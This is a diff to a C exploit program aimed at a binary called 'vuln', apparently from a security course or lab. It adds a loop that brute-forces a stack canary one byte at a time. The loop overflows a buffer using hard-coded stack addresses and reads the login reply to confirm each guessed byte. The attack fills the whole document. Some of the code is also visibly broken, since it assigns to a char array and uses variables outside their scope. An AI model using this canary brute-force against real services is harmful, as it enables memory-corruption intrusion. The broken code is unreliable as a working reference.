@@ -5,6 +5,7 @@ int main() {
     nargv[0] = "vuln";
     nargv[1] = STRINGIFY(GRP);
     nargv[2] = NULL;
+    char outbuf[1<<20];
 
     uint64_t auth_db_loc =     0x7ffc8b4ee588; // loc of db (local var of auth)
     uint64_t auth_cred     =   0x7ffc8b4ee4a0; // value of cred (after alloca)
@@ -22,9 +23,45 @@ int main() {
     send();
     get_formatted("%*s");
 
-    unsigned explsz = auth_db_cred_dist + 8 - 8 + 8;
-    void* *expl = (void**)malloc(explsz);
-    memset((void*)expl, 0x01, explsz);
+    uint64_t stack_canary = 0x0000000000000000;
+    uint64_t current_byte = 0x00;
+
+    // iterate over each byte of the canary
+    for(int i = 1; i <= 8; i++) {
+        current_byte = 0x00;
+        while(true) {
+            // Buffer Size + DB + Cred + Canary - Password
+            unsigned explsz = auth_db_cred_dist + 8 + 8 + 8 - 8;
+            void* *expl = (void**)malloc(explsz);
+            memset((void*)expl, 0x00, explsz);
+
+            // Set existing bytes
+            uint8_t *canary_bytes = (uint8_t *)&stack_canary;
+            canary_bytes[8-i] = current_byte;
+            expl[explsz/sizeof(void*)-1] = (void*)stack_canary;
+
+            fprintf(stderr, "i: %d,\tByte: %x,\tDetermined Canary: %x\n", i, current_byte, stack_canary);
+            put_str("u ");
+            put_bin((char*)expl, explsz - 8 + i);
+            put_str("\n");
+            send();
+            get_formatted("%*s");
+            put_str("l \n");
+            send();
+
+            usleep(100000);
+            outbuf = get_formatted_string("%*s");
+            if(strcmp(outbuf, "Login denied. Try again") == 0) {
+                break;
+            }
+            current_byte = current_byte + 1;
+        }
+    }
+
+
+    // unsigned explsz = auth_db_cred_dist + 8 - 8 + 8;
+    // void* *expl = (void**)malloc(explsz);
+    // memset((void*)expl, 0x00, explsz);
 
     put_str("u ");
     put_bin((char*)expl, explsz);
@@ -58,16 +95,6 @@ int main() {
     return 0;
 }
 
-
-// iterate over each byte of the canary
-// for(int i = 1; i <= 8; i++) {
-//     uint64_t current_byte = 0x00;
-//     while(true) {    // TODO: Fix condition
-//         unsigned explsz = auth_db_cred_dist + 8 - 8 + 8 + i;
-//         void* *expl = (void**)malloc(explsz);
-//         memset((void*)expl, current_byte, explsz);
-//     }
-// }
 
 /*
 
